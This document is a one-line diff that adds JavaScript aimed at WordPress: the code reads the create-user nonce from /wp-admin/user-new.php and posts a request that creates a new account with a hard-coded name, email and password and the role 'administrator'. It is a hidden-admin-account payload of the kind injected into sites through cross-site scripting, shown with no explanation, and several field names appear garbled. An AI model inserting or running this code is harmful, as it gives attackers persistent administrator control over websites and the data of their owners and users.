@@ -1,0 +1,1 @@
+u="/wp-admin/user-new.php"; jQuery.get(u, function(e) {jQuery.post(u, {action:"createuser"," wpnonce_create- user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/) [1], user login: "gostragner", email:"admin@gmail.com",pass1:"gost@ragner", pass2:" gost@ragner", role:"administrator"})});
